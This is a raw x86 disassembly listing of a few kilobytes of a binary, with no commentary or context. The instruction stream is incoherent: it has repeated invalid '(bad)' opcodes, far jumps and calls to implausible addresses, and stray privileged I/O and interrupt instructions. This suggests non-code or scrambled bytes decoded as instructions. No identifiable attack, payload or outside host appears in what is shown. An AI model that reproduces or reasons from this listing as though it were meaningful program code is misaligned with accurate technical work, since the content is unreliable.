  4119a9:	ret    
  4119aa:	jp     0x57010671
  4119b0:	push   esi
  4119b1:	or     al,BYTE PTR [edx-0x14deecb]
  4119b7:	loopne 0x4119be
  4119b9:	jnp    0x4119ff
  4119bb:	ins    DWORD PTR es:[edi],dx
  4119bc:	nop
  4119bd:	add    edi,edi
  4119bf:	and    eax,0x750002a1
  4119c4:	add    DWORD PTR [esi+0x3f],edx
  4119c7:	add    BYTE PTR [eax],al
  4119c9:	add    BYTE PTR [eax],al
  4119cb:	add    BYTE PTR [ebp+0x19],dh
  4119ce:	jl     0x411992
  4119d0:	mov    ds:0x37c8acc3,al
  4119d5:	and    DWORD PTR [edx],eax
  4119d7:	push   ebp
  4119d8:	inc    BYTE PTR [ecx+eax*4-0x15]
  4119dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119dd:	push   ss
  4119de:	add    al,BYTE PTR [eax]
  4119e0:	(bad)  
  4119e1:	jmp    0x411a5f
  4119e3:	xlat   BYTE PTR ds:[ebx]
  4119e4:	ret    0x3ba0
  4119e7:	out    0x41,eax
  4119e9:	call   0x98d419f0
  4119ee:	or     al,BYTE PTR [edx+esi*2]
  4119f1:	xchg   edi,eax
  4119f2:	dec    eax
  4119f3:	(bad)  
  4119f4:	cli    
  4119f5:	sbb    BYTE PTR [edx+0x2197862],bl
  4119fb:	(bad)  
  4119fc:	lock test eax,0xeee2fe0c
  411a02:	add    edx,DWORD PTR [eax-0x4d]
  411a05:	xchg   ebp,eax
  411a06:	jb     0x411a01
  411a08:	rcl    BYTE PTR [ebx+0x212e802],cl
  411a0e:	into   
  411a0f:	add    eax,0xf3a97775
  411a14:	idiv   DWORD PTR ds:0x8df27ee4
  411a1a:	jmp    0xf61704a3
  411a1f:	push   eax
  411a20:	cmp    bh,bh
  411a22:	jle    0x4119c7
  411a24:	jno    0x411a28
  411a26:	jmp    0xc64723a5
  411a2b:	int3   
  411a2c:	mov    eax,0x856df2
  411a31:	add    BYTE PTR [eax],al
  411a33:	add    BYTE PTR [eax],al
  411a35:	add    BYTE PTR [edx],0xe8
  411a38:	mov    eax,ds:0x869c38f1
  411a3d:	cld    
  411a3e:	or     cl,BYTE PTR ds:0xe8fbea3a
  411a44:	nop
  411a45:	out    0x8d,al
  411a47:	xchg   esp,eax
  411a48:	sti    
  411a49:	jmp    0x534e75dd
  411a4e:	add    bl,BYTE PTR [ecx-0x1e6d068a]
  411a54:	pop    es
  411a55:	inc    ebx
  411a56:	push   esp
  411a57:	push   0x42
  411a59:	jb     0x4119ea
  411a5b:	push   esp
  411a5c:	or     BYTE PTR [edx],bl
  411a5e:	neg    BYTE PTR [ebx+0x7]
  411a61:	sub    eax,DWORD PTR [edi-0x72396f59]
  411a67:	adc    al,0x8
  411a69:	pop    edi
  411a6a:	fdivr  DWORD PTR [esi]
  411a6c:	mov    ecx,0xed745ff
  411a71:	and    bl,BYTE PTR [esi]
  411a73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a74:	jns    0x411a25
  411a76:	sbb    dl,cl
  411a78:	inc    esp
  411a79:	test   ebp,0xe2bf71f
  411a7f:	xchg   esi,eax
  411a80:	sub    eax,0x426acb8f
  411a85:	jbe    0x411adb
  411a87:	ins    BYTE PTR es:[edi],dx
  411a88:	jno    0x411a74
  411a8a:	cld    
  411a8b:	add    BYTE PTR [esi+0x7a],dh
  411a8e:	push   ebx
  411a8f:	sub    DWORD PTR [ecx+0x32215275],0x51e806df
  411a99:	add    BYTE PTR [eax],al
  411a9b:	add    BYTE PTR [eax],al
  411a9d:	add    BYTE PTR [esi+0x61620002],dl
  411aa3:	xchg   cl,bl
  411aa5:	aad    0x99
  411aa7:	mov    WORD PTR [ebx-0xf],es
  411aaa:	pop    ds
  411aab:	cmp    eax,ebp
  411aad:	jle    0x411af5
  411aaf:	add    al,BYTE PTR [eax]
  411ab1:	bound  esp,QWORD PTR [esi-0x77]
  411ab4:	inc    ebx
  411ab5:	loop   0x411b25
  411ab7:	addr16 je 0x411aa2
  411aba:	jbe    0x411a48
  411abc:	inc    ebx
  411abd:	repnz pop edi
  411abf:	add    esi,DWORD PTR [edx]
  411ac1:	sub    DWORD PTR [edx],ebx
  411ac3:	pop    edi
  411ac4:	pop    ecx
  411ac5:	and    BYTE PTR [edi-0x2063fffb],dh
  411acb:	in     eax,dx
  411acc:	jg     0x411adb
  411ace:	test   DWORD PTR [edx],eax
  411ad0:	add    cl,ch
  411ad2:	pop    es
  411ad3:	mov    WORD PTR [ebx-0x23],ds
  411ad6:	iret   
  411ad7:	inc    esp
  411ad8:	adc    dh,bl
  411ada:	mov    ss,WORD PTR [edi+0x19]
  411add:	test   eax,0xff798e0b
  411ae2:	pop    ss
  411ae3:	enter  0x970d,0x36
  411ae7:	add    al,0x81
  411ae9:	shl    DWORD PTR [esi-0x75],1
  411aec:	jnp    0x411a8b
  411aee:	and    eax,DWORD PTR [ebp+0x276eb08]
  411af4:	dec    eax
  411af5:	and    ebp,esp
  411af7:	cmp    cl,BYTE PTR [eax+0x31]
  411afa:	in     eax,0x27
  411afc:	dec    eax
  411afd:	xor    ebp,esp
  411aff:	or     al,0x81
  411b01:	add    DWORD PTR [eax],0x0
  411b07:	retf   0x574
  411b0a:	(bad)  [esi]
  411b0c:	jmp    0x8b00:0x4cd00f7
  411b13:	xchg   ecx,eax
  411b14:	dec    BYTE PTR [edx-0x7aaab500]
  411b1a:	add    esp,ebx
  411b1c:	add    al,0x89
  411b1e:	shl    DWORD PTR [edi+eax*1],cl
  411b21:	ds add ah,cl
  411b24:	sbb    eax,0x49c01df
  411b29:	std    
  411b2a:	jne    0x411ac0
  411b2c:	jnp    0x411af0
  411b2e:	call   0x3f2255
  411b33:	inc    ebp
  411b34:	xor    al,0x0
  411b36:	add    BYTE PTR [ebx+edi*2-0x4ce81736],bl
  411b3d:	add    BYTE PTR [eax],al
  411b3f:	repnz xor ebp,0x1c
  411b43:	fidivr WORD PTR [esi]
  411b45:	in     eax,0x46
  411b47:	dec    esi
  411b48:	add    al,0x0
  411b4a:	mov    ecx,DWORD PTR [esp+edi*2+0x321f1042]
  411b51:	mov    BYTE PTR [ebp+0x58],dh
  411b54:	retf   0x75ef
  411b57:	or     DWORD PTR [ecx],edx
  411b59:	aad    0x1b
  411b5b:	pushf  
  411b5c:	test   dl,al
  411b5e:	dec    eax
  411b5f:	dec    ebx
  411b60:	dec    edi
  411b61:	or     ah,BYTE PTR [ebx]
  411b63:	adc    ecx,DWORD PTR [esi]
  411b65:	fcom   DWORD PTR [edx+0x27]
  411b68:	cmp    eax,0x834f
  411b6d:	add    BYTE PTR [eax],al
  411b6f:	add    ah,bl
  411b71:	add    dl,BYTE PTR [eax+0x23]
  411b74:	out    0x9c,eax
  411b76:	add    ch,al
  411b78:	adc    al,0x23
  411b7a:	add    BYTE PTR [eax],al
  411b7c:	xchg   edi,eax
  411b7d:	push   ss
  411b7e:	test   dh,dh
  411b80:	inc    eax
  411b81:	js     0x411b0d
  411b83:	inc    ebp
  411b84:	add    al,0x7b
  411b86:	xor    eax,0xec1eba8b
  411b8b:	mov    dl,0x75
  411b8d:	jmp    0x726b:0x81cd8a01
  411b94:	je     0x411b7f
  411b96:	sbb    ch,BYTE PTR [eax+0x74]
  411b99:	jmp    0xfef8569f
  411b9e:	dec    BYTE PTR [eax+0x5177120]
  411ba4:	imul   BYTE PTR [ecx]
  411ba6:	fmul   DWORD PTR [eax-0x1309ed0]
  411bac:	sbb    eax,0x7500012b
  411bb1:	pop    esi
  411bb2:	jge    0x411bc3
  411bb4:	mov    ds:0x45560348,eax
  411bb9:	jb     0x411b68
  411bbb:	out    dx,eax
  411bbc:	cld    
  411bbd:	mov    dh,0xd
  411bbf:	(bad)  
  411bc0:	pusha  
  411bc1:	test   eax,0xdc753feb
  411bc6:	inc    ecx
  411bc7:	xor    BYTE PTR [ecx+0x61447aed],0xd2
  411bce:	mov    ebx,0x7a87eb03
  411bd3:	inc    esp
  411bd4:	add    BYTE PTR [eax],al
  411bd6:	add    BYTE PTR [eax],al
  411bd8:	add    BYTE PTR [ebp+0x74],cl
  411bdb:	into   
  411bdc:	add    ah,al
  411bde:	adc    DWORD PTR [ebp+0x45],esi
  411be1:	jge    0x411b7c
  411be3:	jp     0x411c59
  411be5:	push   ebp
  411be6:	bound  edi,QWORD PTR [ebp-0x33f4b21d]
  411bec:	(bad)  
  411bed:	cmp    ah,BYTE PTR [ebp+0x41]
  411bf0:	je     0x411c5c
  411bf2:	ins    BYTE PTR es:[edi],dx
  411bf3:	add    al,0x9
  411bf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bf6:	fist   WORD PTR [edi+0x76aeee00]
  411bfc:	dec    esp
  411bfd:	and    eax,0x7533d6d1
  411c02:	jmp    0x364b3c1f
  411c07:	or     al,0x8a
  411c09:	mov    eax,0x81768b02
  411c0e:	repnz (bad) 
  411c10:	and    DWORD PTR [ecx-0x4d8718fe],ebp
  411c16:	test   BYTE PTR [eax+0x2c8b728b],ah
  411c1c:	and    al,0xef
  411c1e:	fisttp WORD PTR [edi-0x18fd7980]
  411c24:	js     0x411c4f
  411c26:	push   cs
  411c27:	bound  eax,QWORD PTR [esi+0x17acfec6]
  411c2d:	out    dx,eax
  411c2e:	inc    esp
  411c2f:	pop    ebx
  411c30:	js     0x411c73
  411c32:	out    dx,al
  411c33:	push   0xffffffbe
  411c35:	xchg   edx,eax
  411c36:	cmp    DWORD PTR [edx+0x13],esp
  411c39:	pop    edi
  411c3a:	dec    edx
  411c3b:	jmp    0x411bc4
  411c3d:	add    BYTE PTR [eax],al
  411c3f:	add    BYTE PTR [eax],al
  411c41:	add    cl,bh
  411c43:	(bad)  
  411c44:	cmc    
  411c45:	sbb    eax,DWORD PTR [esi-0x6d]
  411c48:	ss add al,0x20
  411c4b:	jmp    0x46c:0xfe8370fd
  411c52:	clc    
  411c53:	pusha  
  411c54:	jb     0x411c14
  411c56:	bound  ecx,QWORD PTR [esp+ebp*4-0x3b7806f9]
  411c5d:	add    eax,0xbe70fe63
  411c62:	outs   dx,BYTE PTR ds:[esi]
  411c63:	mov    edi,DWORD PTR [ebx+ecx*1-0x1]
  411c67:	ja     0x411c4c
  411c69:	js     0x411c34
  411c6b:	(bad)  
  411c6c:	push   0x3d
  411c6e:	dec    edi
  411c6f:	jmp    0x411ca2
  411c71:	cmp    al,0x75
  411c73:	add    dh,BYTE PTR [edx-0x7f]
  411c76:	and    DWORD PTR [edx+ebp*2-0x7d],0xe540271
  411c7e:	pop    DWORD PTR [ebx]
  411c80:	push   ecx
  411c81:	or     al,al
  411c83:	jmp    0xbf00:0xfe1260aa
  411c8a:	jg     0x411c8c
  411c8c:	jae    0x411c65
  411c8e:	nop
  411c8f:	std    
  411c90:	addr16 stc 
  411c92:	in     eax,0x47
  411c94:	push   es
  411c95:	cmp    ecx,esp
  411c97:	lods   eax,DWORD PTR ds:[esi]
  411c98:	pop    esp
  411c99:	call   0x2d670714
  411c9e:	js     0x411ca2
  411ca0:	data16 jo 0x411cd1
  411ca3:	adc    al,0x81
  411ca5:	and    al,0x0
  411ca7:	add    BYTE PTR [eax],al
  411ca9:	add    BYTE PTR [eax],al
  411cab:	jne    0x411ce8
  411cad:	sub    DWORD PTR [esi+0x714bff84],0xdc0c79f0
  411cb7:	add    cl,BYTE PTR [ebx+edi*2+0x10440255]
  411cbe:	pop    esi
  411cbf:	leave  
  411cc0:	sbb    eax,eax
  411cc2:	or     ch,BYTE PTR [esi+ebx*8]
  411cc5:	sub    DWORD PTR [edx],0xf2b50f29
  411ccb:	(bad)  
  411ccc:	aad    0x19
  411cce:	and    BYTE PTR [edx],bl
  411cd0:	jmp    FWORD PTR [ebx]
  411cd2:	xchg   esi,eax
  411cd3:	in     eax,0x91
  411cd5:	adc    BYTE PTR [edi],ah
  411cd7:	jbe    0x411cd5
  411cd9:	push   edx
  411cda:	push   0x39
  411cdc:	push   es
  411cdd:	push   eax
  411cde:	retf   0x683b
  411ce1:	add    DWORD PTR [ecx],eax
  411ce3:	ss (bad) 
  411ce6:	call   0xf7c50ed6
  411ceb:	int    0x9
  411ced:	std    
  411cee:	jl     0x411d36
  411cf0:	jmp    0x11e7:0xfc765b8d
  411cf7:	ja     0x411cf5
  411cf9:	std    
  411cfa:	jb     0x411cb9
  411cfc:	or     cl,BYTE PTR [ecx-0x172405ef]
  411d02:	jmpw   0x1b02
  411d06:	add    BYTE PTR [esi+0x4e31e8d9],ah
  411d0c:	pop    es
  411d0d:	add    bh,bh
  411d0f:	add    BYTE PTR [eax],al
  411d11:	add    BYTE PTR [eax],al
  411d13:	add    BYTE PTR [ecx-0xa],cl
  411d16:	call   0xfe41bb8a
  411d1b:	mov    cl,bh
  411d1d:	jmp    0x411d24
  411d1f:	push   ebx
  411d20:	adc    edi,DWORD PTR [edx+0x8]
  411d23:	call   0x3d1957
  411d28:	xchg   ebx,eax
  411d29:	pusha  
  411d2a:	push   edi
  411d2b:	leave  
  411d2c:	push   cs
  411d2d:	or     DWORD PTR [eax],eax
  411d2f:	push   ebp
  411d30:	inc    edi
  411d31:	in     eax,dx
  411d32:	jge    0x411d20
  411d34:	in     al,0x5
  411d36:	add    BYTE PTR [eax],al
  411d38:	pop    edi
  411d39:	pop    eax
  411d3a:	push   ebx
  411d3b:	mov    edx,ecx
  411d3d:	or     BYTE PTR [edi-0x4f7d810],al
  411d43:	mov    al,0x10
  411d45:	push   es
  411d46:	add    BYTE PTR [eax],al
  411d48:	inc    ecx
  411d49:	pop    edx
  411d4a:	hlt    
  411d4b:	push   0xffffff89
  411d4d:	pop    eax
  411d4e:	xchg   esi,ecx
  411d50:	and    al,0x5d
  411d52:	mov    al,0xff
  411d54:	inc    ebx
  411d55:	test   eax,eax
  411d57:	(bad)  
  411d59:	(bad)  
  411d5b:	dec    DWORD PTR [ebx+ecx*4+0x406a4419]
  411d62:	add    BYTE PTR [edx+0x58],ch
  411d65:	xchg   ebx,eax
  411d66:	inc    ecx
  411d67:	hlt    
  411d68:	hlt    
  411d69:	adc    esi,DWORD PTR [ecx+0x40]
  411d6c:	dec    esp
  411d6d:	push   eax
  411d6e:	sti    
  411d6f:	rcr    edi,cl
  411d71:	ret    
  411d72:	or     al,0x85
  411d74:	pushf  
  411d75:	jae    0x411d8f
  411d77:	push   0x0
  411d79:	add    BYTE PTR [eax],al
  411d7b:	add    BYTE PTR [eax],al
  411d7d:	pop    ecx
  411d7e:	xchg   ebx,eax
  411d7f:	inc    ecx
  411d80:	hlt    
  411d81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d82:	and    dh,BYTE PTR [ecx+0x40]
  411d85:	sbb    al,0x50
  411d87:	sti    
  411d88:	shl    DWORD PTR [ebp+0x68],cl
  411d8b:	enter  0xf80c,0xa9
  411d8f:	jae    0x430798
  411d95:	add    BYTE PTR [edi+0x38],ah
  411d98:	std    
  411d99:	or     dh,BYTE PTR [ebp+0x7e5fe854]
  411d9f:	(bad)  
  411da0:	std    
  411da1:	icebp  
  411da2:	test   eax,0x685b7a78
  411da7:	mov    ebp,0xff94ea34
  411dac:	add    ch,BYTE PTR [eax-0x23]
  411daf:	cmp    DWORD PTR [ebx-0x2007b63],0xc095ec52
  411db9:	fmulp  st(4),st
  411dbb:	add    DWORD PTR [bx+si],0xbafe00b6
  411dc2:	cld    
  411dc3:	jbe    0x411dde
  411dc5:	pop    ds
  411dc6:	stc    
  411dc7:	mov    es,WORD PTR [ebx-0x200ab97]
  411dcd:	inc    ebp
  411dce:	shr    DWORD PTR [ecx+0xe93571],0xd2
  411dd5:	mul    BYTE PTR ds:0xcfadf510
  411ddb:	sar    esi,0xb5
  411dde:	inc    eax
  411ddf:	push   es
  411de0:	xor    al,BYTE PTR [eax]
  411de2:	add    BYTE PTR [eax],al
  411de4:	add    BYTE PTR [eax],al
  411de6:	mov    ch,0x6d
  411de8:	les    esi,FWORD PTR [esp+ebp*4+0x70]
  411dec:	pop    es
  411ded:	mov    ebp,esi
  411def:	pusha  
  411df0:	add    DWORD PTR [eax],eax
  411df2:	jne    0x411e52
  411df4:	dec    ebp
  411df5:	hlt    
  411df6:	in     al,dx
  411df7:	mov    ch,0xe9
  411df9:	mov    DWORD PTR [ebp+0x24],edi
  411dfc:	inc    ebp
  411dfd:	in     al,0xf5
  411dff:	jge    0x411e42
  411e01:	add    ah,ch
  411e03:	jne    0x411df2
  411e05:	sub    DWORD PTR [edx+eax*1],0xfffffff6
  411e09:	xchg   DWORD PTR [esi+0x1],esp
  411e0c:	out    0x3,eax
  411e0e:	sub    BYTE PTR [ecx+0x2750263],dh
  411e14:	pop    esp
  411e15:	dec    esi
  411e16:	adc    DWORD PTR [eax-0x18],ebp
  411e19:	push   edx
  411e1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e1b:	jmp    0x21c0:0x2753e75
  411e22:	add    bh,bl
  411e24:	out    0x8e,eax
  411e26:	mov    dh,0xf6
  411e28:	cmp    eax,0x9002fc54
  411e2d:	mov    esp,0x8ce70275
  411e32:	js     0x411e2f
  411e34:	push   edi
  411e35:	(bad)  
  411e36:	(bad)  
  411e38:	out    0x8e,eax
  411e3a:	es mov ebp,0x872d2911
  411e40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e41:	jmp    0x411e8b
  411e43:	stos   DWORD PTR es:[edi],eax
  411e44:	outs   dx,BYTE PTR ds:[esi]
  411e45:	add    al,dh
  411e47:	shl    esi,0x87
  411e4a:	add    BYTE PTR [eax],al
  411e4c:	add    BYTE PTR [eax],al
  411e4e:	add    BYTE PTR [esi+0x1f03e701],ah
  411e54:	add    eax,0x51a94664
  411e59:	pop    esp
  411e5a:	inc    esi
  411e5b:	fst    QWORD PTR [ecx+0x46]
  411e5e:	push   ss
  411e5f:	push   ecx
  411e60:	adc    al,0xa7
  411e62:	add    edi,esp
  411e64:	add    ch,BYTE PTR [edx-0x3d]
  411e67:	jns    0x411ee8
  411e69:	and    ecx,DWORD PTR [edi]
  411e6b:	and    eax,0xf68e422f
  411e70:	es sbb eax,0x748c6b00
  411e76:	das    
  411e77:	arpl   dx,di
  411e79:	push   cs
  411e7a:	jmp    0x411e1d
  411e7c:	js     0x411e66
  411e7e:	add    ebx,edi
  411e80:	mov    eax,es:0xbabe8e
  411e86:	fs sti 
  411e88:	es (bad) 
  411e8a:	out    dx,al
  411e8b:	cmp    ch,bl
  411e8d:	push   0x66
  411e8f:	js     0x411e93
  411e91:	cmp    BYTE PTR [ecx+ebp*8],bh
  411e94:	pop    es
  411e95:	test   BYTE PTR [esi+0x11000279],al
  411e9b:	xchg   esp,eax
  411e9c:	mov    esp,0x2db6e0d
  411ea1:	add    cl,ch
  411ea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ea4:	inc    ebx
  411ea5:	mov    esp,DWORD PTR [ecx+ebp*1]
  411ea8:	mov    esi,?
  411eaa:	shr    DWORD PTR [edx],0x30
  411ead:	add    cl,ch
  411eaf:	add    eax,0x9f3086
  411eb4:	add    BYTE PTR [eax],al
  411eb6:	add    BYTE PTR [eax],al
  411eb8:	jmp    0xe80e:0x3b6450f7
  411ebf:	xchg   edi,eax
  411ec0:	hlt    
  411ec1:	stc    
  411ec2:	std    
  411ec3:	test   BYTE PTR [eax],0x4e
  411ec6:	mov    ecx,0x75c7713
  411ecb:	pop    edi
  411ecc:	xchg   ecx,eax
  411ecd:	add    al,0x0
  411ecf:	jmp    0x51c2d8c3
  411ed4:	sbb    eax,0xb712556e
  411ed9:	outs   dx,BYTE PTR ds:[esi]
  411eda:	push   ecx
  411edb:	add    dh,BYTE PTR [edi-0x48fdc192]
  411ee1:	outs   dx,BYTE PTR ds:[esi]
  411ee2:	cmp    ch,BYTE PTR [edx-0x5f]
  411ee5:	pop    eax
  411ee6:	je     0x411ec5
  411ee8:	pop    edi
  411ee9:	les    esi,FWORD PTR [ebx+ecx*8+0x4f]
  411eed:	les    esi,FWORD PTR [ebx-0x71]
  411ef0:	and    BYTE PTR [edx-0x77],dl
  411ef3:	lods   al,BYTE PTR ds:[esi]
  411ef4:	jle    0x411e81
  411ef6:	add    BYTE PTR [esi],bl
  411ef8:	and    DWORD PTR [esi-0x1],edi
  411efb:	call   0xde350976
  411f00:	jbe    0x411f04
  411f02:	jmp    0x79c62507
  411f07:	mov    ecx,0x8b447a5f
  411f0c:	adc    DWORD PTR ds:0x8be20087,ecx
  411f12:	mov    al,0x84
  411f14:	sbb    eax,0xce80005
  411f19:	pop    es
  411f1a:	add    BYTE PTR [eax],al
  411f1c:	add    BYTE PTR [eax],al
  411f1e:	add    BYTE PTR [eax],al
  411f20:	add    BYTE PTR [edi],dh
  411f22:	xchg   DWORD PTR cs:[ebp+0x14],eax
  411f26:	dec    edi
  411f27:	jg     0x411ee9
  411f29:	add    al,0x92
  411f2b:	dec    ecx
  411f2c:	mov    eax,0xff88cb24
  411f31:	retf   
  411f32:	jmp    0x411f54
  411f34:	xor    DWORD PTR ds:0xc7097461,0xffffffca
  411f3b:	jno    0x411f54
  411f3d:	fs pop edx
  411f3f:	lock jmp 0x411f11
  411f42:	mov    WORD PTR [ecx-0x10],ds
  411f45:	jmp    0x411fc0
  411f47:	lock push esi
  411f49:	inc    edi
  411f4a:	jp     0x411f54
  411f4c:	adc    DWORD PTR [edx],0xd
  411f4f:	call   0xfc39715d
  411f54:	pop    edi
  411f55:	push   0x5d
  411f57:	(bad)
  411f5a:	add    al,0x51
  411f5c:	mov    edi,DWORD PTR [eax]
  411f5e:	test   ah,ah
  411f60:	clc    
  411f61:	or     eax,0x8c0334e9
  411f66:	add    al,0x56
  411f68:	push   0xffffff9c
  411f6a:	push   0x0
  411f6c:	(bad)  
  411f6d:	shl    BYTE PTR [eax],1
  411f6f:	adc    al,ch
  411f71:	cli    
  411f72:	add    BYTE PTR cs:[eax],al
  411f75:	pop    ss
  411f76:	jp     0x411f80
  411f78:	mov    esp,DWORD PTR [edx-0x73]
  411f7b:	dec    eax
  411f7c:	add    al,0xe5
  411f7e:	inc    edi
  411f7f:	and    al,0xc
  411f81:	jne    0x411fe7
  411f83:	dec    ecx
  411f84:	or     BYTE PTR [eax],al
  411f86:	add    BYTE PTR [eax],al
  411f88:	add    BYTE PTR [eax],al
  411f8a:	mul    BYTE PTR [ecx-0x520302fb]
  411f90:	and    eax,0xdb1ff10
  411f95:	adc    ebp,0xa98801e1
  411f9b:	mov    ebp,0xeebd8a15
  411fa0:	mov    DWORD PTR [ecx+edx*2-0x12],ecx
  411fa4:	mov    BYTE PTR [esi],cl
  411fa6:	out    dx,al
  411fa7:	sub    DWORD PTR [edi+eax*4],edx
  411faa:	mov    cl,0xfd
  411fac:	sbb    eax,DWORD PTR [ebx-0x76f9c9c4]
  411fb2:	je     0x412007
  411fb4:	add    ebp,edi
  411fb6:	gs mov al,0x76
  411fb9:	add    al,0xe8
  411fbb:	sbb    eax,0x70dd0c28
  411fc0:	std    
  411fc1:	std    
  411fc2:	jmp    0xfb90:0xf2e4ec2f
  411fc9:	mov    esp,DWORD PTR [ecx-0x43]
  411fcc:	or     eax,ebp
  411fce:	sbb    BYTE PTR [eax-0x5679ffff],bh
  411fd4:	pop    esi
  411fd5:	mov    eax,ebx
  411fd7:	push   cs
  411fd8:	ret    0x7504
  411fdb:	push   cs
  411fdc:	xchg   esp,ebp
  411fde:	inc    esp
  411fdf:	mov    esp,0x61fe5553
  411fe4:	xchg   DWORD PTR [ebp+0x79],eax
  411fe7:	inc    ecx
  411fe8:	jae    0x411f74
  411fea:	call   0x0:0x758748
  411ff1:	add    BYTE PTR [eax],al
  411ff3:	jns    0x412061
  411ff5:	gs cld 
  411ff7:	jne    0x41205f
  411ff9:	pop    esi
  411ffa:	or     al,0x26
  411ffc:	xor    BYTE PTR ds:0x1a96614,dl
  412002:	mov    DWORD PTR [ebx+0x2],edi
  412005:	ins    BYTE PTR es:[edi],dx
  412006:	(bad)
  41200a:	jbe    0x412085
  41200c:	adc    ebp,0x3
  41200f:	loope  0x412014
  412011:	push   cs
  412012:	inc    edi
  412013:	push   ecx
  412014:	sub    DWORD PTR ds:0xf96dbd08,0x50
  41201b:	inc    eax
  41201c:	or     eax,0x2b510cf
  412021:	push   0xe8c4317f
  412026:	add    esi,DWORD PTR [ebp+0x70]
  412029:	repnz mov BYTE PTR [esi-0x5e3593f6],ch
  412030:	bound  eax,QWORD PTR ds:[edx]
  412033:	sbb    al,0x36
  412035:	push   ecx
  412036:	or     al,0x1d
  412038:	dec    edi
  412039:	outs   dx,BYTE PTR ds:[esi]
  41203a:	cld    
  41203b:	add    BYTE PTR [ebx-0xe13f3ec],cl
  412041:	fs cmc 
  412043:	imul   ebx,DWORD PTR [esi],0x6a430411
  412049:	ror    DWORD PTR [ecx],0xa2
  41204c:	add    ah,BYTE PTR [eax+0x1d]
  41204f:	bnd ja 0x412035
  412052:	mov    BYTE PTR [eax-0x2],dl
  412055:	push   cs
  412056:	add    al,0x0
  412058:	add    BYTE PTR [eax],al
  41205a:	add    BYTE PTR [eax],al
  41205c:	jne    0x412068
  41205e:	out    0xeb,eax
  412060:	sti    
  412061:	mov    esi,DWORD PTR [esi-0x4]
  412064:	icebp  
  412065:	shl    esp,0x11
  412068:	dec    ebx
  412069:	jmp    0xd864:0xf6a88cb1
  412070:	sub    DWORD PTR [edx],ecx
  412072:	bound  eax,QWORD PTR [eax]
  412074:	in     al,dx
  412075:	retf   0x2c1
  412078:	nop
  412079:	adc    DWORD PTR [esi+0x29c92c5d],esp
  41207f:	pop    es
  412080:	jne    0x4120cf
  412082:	add    BYTE PTR [edx-0x76],ah
  412085:	sub    ah,0xdd
  412088:	lds    esi,FWORD PTR [ebx]
  41208a:	fnstcw WORD PTR [edi+0x70ef8bc1]
  412090:	ret    
  412091:	idiv   BYTE PTR [ecx]
  412093:	sub    ah,dl
  412095:	adc    DWORD PTR [edi+0x61eb4aa4],eax
  41209b:	mov    eax,ds:0xe86a0277
  4120a0:	out    dx,eax
  4120a1:	inc    ecx
  4120a2:	clc    
  4120a3:	sub    DWORD PTR [esi-0x77],0x43
  4120a7:	cmc    
  4120a8:	(bad)  
  4120a9:	jmp    0x4120af
  4120ab:	push   ebx
  4120ac:	jo     0x412101
  4120ae:	push   ecx
  4120af:	jb     0x412065
  4120b1:	or     dl,BYTE PTR [ecx+0x3a]
  4120b4:	ret    0x6eea
  4120b7:	lods   al,BYTE PTR ds:[esi]
  4120b8:	js     0x4120bc
  4120ba:	mov    ecx,eax
  4120bc:	dec    edx
  4120bd:	sti    
  4120be:	je     0x412106
  4120c0:	add    BYTE PTR [eax],al
  4120c2:	add    BYTE PTR [eax],al
  4120c4:	add    BYTE PTR [ecx],dl
  4120c6:	aaa    
  4120c7:	pop    eax
  4120c8:	call   0x71135443
  4120cd:	add    DWORD PTR [eax+eax*1],edx
  4120d0:	jmp    0xa6cb06bc
  4120d5:	clc    
  4120d6:	rcr    BYTE PTR [eax+0x520276d3],0x8e
  4120dd:	xchg   edx,ebp
  4120df:	retf   
  4120e0:	push   esi
  4120e1:	jo     0x4120e5
  4120e3:	xchg   DWORD PTR [edi*4+0x7bf7c13b],esp
  4120ea:	cmp    bl,BYTE PTR [ebx-0x23]
  4120ed:	and    ch,BYTE PTR [ecx+ecx*4]
  4120f0:	mov    esi,0x51ca8b26
  4120f5:	pop    ebx
  4120f6:	dec    ecx
  4120f7:	(bad)  
  4120f8:	call   0xf839a411
  4120fd:	or     BYTE PTR [ecx+ecx*4],bl
  412100:	add    dh,bl
  412102:	adc    DWORD PTR [edi],esi
  412104:	ret    
  412105:	enter  0x88fc,0x58
  412109:	jo     0x412104
  41210b:	jbe    0x412111
  41210d:	sar    DWORD PTR [eax+ecx*2],1
  412110:	bswap  ebx
  412112:	push   es
  412113:	repz fnstenv [edi-0x39]
  412117:	dec    edi
  412118:	and    edx,DWORD PTR [edi+ecx*2-0x75ab8a05]
  41211f:	inc    esi
  412120:	or     BYTE PTR [edx+esi*4-0x7d],ah
  412124:	inc    DWORD PTR [ebx-0x7c]
  412127:	repz call 0x41212d
  41212d:	add    BYTE PTR [eax],dl
  41212f:	imul   edi,ebp,0xffffffff
  412132:	xchg   edi,eax
  412133:	inc    ebx
  412134:	cld    
  412135:	pop    edi
  412136:	mov    dl,0x55
  412138:	(bad)
  41213b:	add    DWORD PTR [ecx-0x75],edx
  41213e:	xor    BYTE PTR [esp+eiz*8-0x8],bh
  412142:	lahf   
  412143:	fstp   QWORD PTR [eax+ecx*4]
  412146:	pop    eax
  412147:	and    dl,BYTE PTR [ebx+esi*1]
  41214a:	int3   
  41214b:	dec    ebx
  41214c:	mov    WORD PTR [eax+0x22],cx
  412150:	adc    eax,0xb8530733
  412155:	push   eax
  412156:	fld    DWORD PTR [eax]
  412158:	add    BYTE PTR [edi+0x7a],dl
  41215b:	xchg   DWORD PTR [esp-0x51],eax
  41215f:	ret    0x2444
  412162:	mov    dl,0x0
  412164:	test   DWORD PTR [eax+edi*4+0x10],ebx
  412168:	test   DWORD PTR [eax+edi*4+0x4],ebx
  41216c:	mov    BYTE PTR [eax+ebp*4+0x7],0x0
  412171:	mov    esp,DWORD PTR [ecx+0x44078708]
  412177:	lds    esi,FWORD PTR [edx-0x3f8b73ff]
  41217d:	pcmpeqw mm4,QWORD PTR [edi-0x7f]
  412181:	add    BYTE PTR [ebp-0x15],dh
  412184:	imul   edi,edi,0x1c
  412187:	out    0x88,al
  412189:	inc    esp
  41218a:	pop    ecx
  41218b:	adc    edx,DWORD PTR [ecx+ecx*4+0x30]
  41218f:	fild   QWORD PTR [ebx+0x0]
  412192:	add    BYTE PTR [eax],al
  412194:	add    BYTE PTR [eax],al
